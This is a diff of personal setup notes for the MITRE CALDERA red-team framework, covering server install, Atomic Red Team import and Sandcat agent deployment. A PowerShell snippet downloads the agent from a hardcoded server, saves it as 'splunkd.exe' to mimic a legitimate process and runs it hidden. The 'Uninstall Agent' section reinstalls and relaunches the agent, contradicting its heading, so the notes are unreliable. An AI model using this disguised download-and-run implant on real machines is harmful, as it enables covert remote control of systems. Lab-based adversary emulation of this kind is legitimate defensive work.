@@ -11,136 +11,40 @@ pip3 install -r requirements.txt
 python3 server.py --insecure --build
 ```
 
-```
-sudo update --fix-missing -y
-sudo apt install caldera
-caldera --insecure --build
-https://localhost:8888
-red / admin
-
-```
-
-### Run Caldera
-
-```
-caldera --insecure --build
-https://localhost:8888    red / admin
-```
-
-```
-sudo systemctl stop caldera
-cd ~/caldera5
-source ~/caldera_venv/bin/activate
-python3 server.py --insecure --api-token
-
-```
 
 ### Start Caldera
-
 ```
+
 source ~/caldera_venv/bin/activate
 cd ~/caldera5
 python3 server.py --insecure --build
+python3 server.py --insecure --api-token
 
 sudo systemctl daemon-reload
 sudo systemctl restart caldera
 sudo systemctl status caldera
 
-
+https://localhost:8888    admin / admin
 ```
 
 ### Clone Atomic Red Team
 
 ```
-cd ~/caldera5/plugins
-git clone https://github.com/mitre/atomic.git
+cd caldera/plugins/atomic/data
+git clone https://github.com/redcanaryco/atomic-red-team.git
+
+Ensure the folder is named exactly atomic-red-team
+Filter by Source: In the Caldera UI, go to Abilities and filter by the "atomic" repository to see the imported tests.
 ```
 
 
-### Create an agent (Sandcat)
 
-In Caldera UI:
-Agents → Deploy Agent → Sandcat
-Linux one-liner example:
+## Install agent on Windows
 
-```
-curl -sk https://localhost:8888/file/download -H "file:sandcat.go" -o sandcat.go
-go build sandcat.go
-./sandcat -server https://YOUR_CALDERA_IP:8888 -group red
-
-```
-
-### Install agent on Windows
-
-Go to Agents → Deploy Agent
-
-Select:
-
-Agent: Sandcat
-
-Platform: windows
-
-Architecture: amd64
-
-Copy the provided download command or URL
-
-sandcat.exe -server https://SERVER_IP:8888 -group red
-https://SERVER_IP:8888/file/download?sandcat.go
-
-```
-cd ~/caldera5/plugins/sandcat
-GOOS=windows GOARCH=amd64 go build -o sandcat.exe
-
-```
 
 ```
 Set-ExecutionPolicy Bypass -Scope Process -Force
 Unblock-File .\sandcat.exe
-
-Invoke-WebRequest -Uri https://SERVER_IP:8888/file/download -Headers @{"file"="sandcat.exe"} -OutFile sandcat.exe; .\sandcat.exe -server https://SERVER_IP:8888 -group red
-
-
-```
-
-
-Correct steps to build a Windows agent
-
-Go to the Go agent folder:
-
-cd ~/caldera5/plugins/sandcat/gocat
-
-
-Initialize Go module (needed once):
-
-go mod tidy
-
-
-Build the Windows agent:
-
-GOOS=windows GOARCH=amd64 go build -o sandcat.exe main.go
-
-
-main.go is the entry point for the Sandcat agent.
-
-For Linux: GOOS=linux GOARCH=amd64 go build -o sandcat_linux main.go
-
-Optional: compress the EXE:
-
-upx -9 sandcat.exe
-
-Deploy the agent to Windows
-
-Copy the sandcat.exe to the target machine and run:
-
-.\sandcat.exe -server https://<CALDERA_SERVER_IP>:8888 -group red
-
-
-Replace <CALDERA_SERVER_IP> with your server IP.
-
-The agent should appear in Agents → Windows in the CALDERA UI.
-
-
-```
 Test-NetConnection 192.168.1.47 -Port 8888
 
 $server="http://192.168.1.47:8888";
@@ -151,5 +55,71 @@ $wc.Headers.add("file","sandcat.go");
 $data=$wc.DownloadData($url);
 [io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
 Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+
+```
+
+
+## Uninstall Agent
+
+```
+
+get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -Force
+Remove-Item "C:\Users\Public\splunkd.exe" -Force -ErrorAction Ignore
+
+$server="http://192.168.1.47:8888"
+$url="$server/file/download"
+
+# Create WebClient and add required headers
+$wc = New-Object System.Net.WebClient
+$wc.Headers.add("platform","windows")
+$wc.Headers.add("file","sandcat.go")
+
+# Download the agent
+$data = $wc.DownloadData($url)
+
+# Write executable to disk
+[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data)
+
+# Start the agent pointing to server and group
+Start-Process -FilePath "C:\Users\Public\splunkd.exe" -ArgumentList "-server $server -group red" -WindowStyle hidden
+
+Get-Process splunkd
+
+```
+
+## uninstall Caldera
+
+```
+  GNU nano 8.7                                                     uninstall.sh                                                              
+#!/usr/bin/env bash
+# MITRE CALDERA Uninstall Script
+# Run as a user with sudo privileges
+
+set -euo pipefail
+
+USER_HOME="${HOME}"
+CALDERA_HOME="$USER_HOME/caldera5"
+VENV_PATH="$USER_HOME/caldera_venv"
+SERVICE_PATH="/etc/systemd/system/caldera.service"
+
+echo "Stopping CALDERA service..."
+sudo systemctl stop caldera || true
+sudo systemctl disable caldera || true
+
+echo "Removing systemd service..."
+sudo rm -f "$SERVICE_PATH"
+sudo systemctl daemon-reload
+
+echo "Removing CALDERA directory..."
+rm -rf "$CALDERA_HOME"
+
+echo "Removing Python virtual environment..."
+rm -rf "$VENV_PATH"
+
+echo "Optional: Remove plugins directory if separate (usually inside $CALDERA_HOME)"
+# rm -rf "$USER_HOME/caldera5/plugins"
+
+echo "CALDERA has been uninstalled."
+
 
 ```
